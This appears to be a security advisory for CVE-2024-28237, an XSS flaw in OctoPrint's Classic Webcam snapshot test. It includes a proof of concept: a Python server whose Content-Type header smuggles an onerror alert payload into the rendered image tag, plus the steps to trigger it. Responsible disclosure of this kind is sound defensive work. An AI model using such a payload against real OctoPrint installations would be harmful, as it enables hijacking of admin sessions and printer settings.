  - CVE-2024-28237
summary: "XSS via the \"Snapshot Test\" feature in Classic Webcam plugin settings\n### Impact\n\
  \nOctoPrint versions up until and including 1.9.3 contain a vulnerability that allows malicious\
  \ admins to configure or talk a victim with administrator rights into configuring a webcam\
  \ snapshot URL which when tested through the \"Test\" button included in the web interface\
  \ will execute JavaScript code in the victims browser when attempting to render the snapshot\
  \ image.\n\nAn attacker who successfully talked a victim with admin rights into performing\
  \ a snapshot test with such a crafted URL could use this to retrieve or modify sensitive configuration\
  \ settings, interrupt prints or otherwise interact with the OctoPrint instance in a malicious\
  \ way.\n\n### Patches\n\nThe vulnerability will be patched in version 1.10.0.\n\n### Workaround\n\
  \nOctoPrint administrators are strongly advised to thoroughly vet who has admin access to\
  \ their installation and what settings they modify based on instructions by strangers.\n\n\
  ### PoC\n\nBelow are the steps to reproduce the vulnerability:\n\n1. Create a URL that responds\
  \ with a malicious content type. For example, creating the following python script:\n   ```\n\
  \   from http.server import BaseHTTPRequestHandler, HTTPServer\n\n   class MyHTTPRequestHandler(BaseHTTPRequestHandler):\n\
  \       def do_GET(self):\n           self.send_response(200)\n           self.send_header('Content-Type',\
  \ 'image/\"onerror=\"alert(1)\"')\n           self.end_headers()\n           self.wfile.write(b'Ok')\n\
  \n   def run():\n       server_address = ('', 8080)\n       httpd = HTTPServer(server_address,\
  \ MyHTTPRequestHandler)\n       print('Server listening on 0.0.0.0:8080...')\n       httpd.serve_forever()\n\
  \n   if __name__ == '__main__':\n       run()\n   ```\n\n2. Go to OctoPrint settings --> Plugins\
  \ --> Classic Webcam and enter the URL of that page as the Snapshot URL. \n\n3. Click on the\
  \ \"Test\" button to trigger XSS. A Javascript alert should appear, demonstrating the actual\
  \ code injection.\n\n### Credits\n\nThis vulnerability was discovered and responsibly disclosed\
  \ to OctoPrint by Jacopo Tediosi."
